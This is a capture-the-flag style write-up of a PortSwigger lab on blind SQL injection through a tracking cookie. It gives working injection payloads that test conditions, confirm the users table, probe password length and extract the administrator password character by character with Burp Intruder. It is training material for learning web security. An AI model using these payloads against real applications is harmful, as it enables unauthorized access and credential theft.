# Lab: Blind SQL injection with conditional responses

## Lab's description

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and no error messages are displayed. But the application includes a "Welcome back" message in the page if the query returns any rows.

The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user.

**End goal:** log in as the `administrator` user.

## Solution

Use Burp Suite to intercept and modify `TrackingId` cookie.

First, we need to see the behavior after modify cookie. Go to login page

![](1.png)

Here is my cookie: `wflhKe4JqJmhwH9j`. Send this to Repeater and I will change it to `wflhKe4JqJmhwH9j' and '1'='1`

The `Welcome back` message appears in the response. But if I change it to `wflhKe4JqJmhwH9j' and '1'='2`

The `Welcome back` message does not appear in the response.

Next step, we need to confirm that the database has table named `users`.

`wflhKe4JqJmhwH9j' and (select 'a' from users limit 1) = 'a`

We can see the message `Welcome back` that means it works. Now we gonna see if the username `administrator` exits or not.

`wflhKe4JqJmhwH9j' and (select 'a' from users where username = 'administrator') = 'a`

We can see the message `Welcome back` so it works. Next we gonna see the length of the password. Send the target to Intruder and loop it from 1 to 20.

`wflhKe4JqJmhwH9j' and (select 'a' from users where username = 'administrator' and length(password) > 1) = 'a`

Add `ยง` to number `1`.

![](9.png)

Add values from 1 to 20 in payload and `Start attack`

![](8.png)

![](7.png)

We can see the length is different, because it does not respond the `Welcome back` message.

After that, we will discover character-by-character for the password.

`wflhKe4JqJmhwH9j' and (select substring(password,1,1) from users where username = 'administrator') = 'a`

Add `ยง` to number `1` and letter `a`. Change `Attack type` to `Cluster bomb`.

![](6.png)

Set first payload `Payload type` to `number`, from `1` to `20`.

![](5.png)

Set second payload's value from `a` to `z` and `0` to `9`.

![](4.png)

Change the `Settings`, add `Welcome` to `Grep-Match` for searching the string `Welcome` in respond.

![](3.png)

Filter the `Welcome` column.

![](2.png)

After half hour, I got this:

`Username: administrator`

`Password: 0ywsbb0jakvcasgvzwsr`

**Source:** [Lab: Blind SQL injection with conditional responses](https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-exploiting-blind-sql-injection-by-triggering-conditional-responses/sql-injection/blind/lab-conditional-responses)
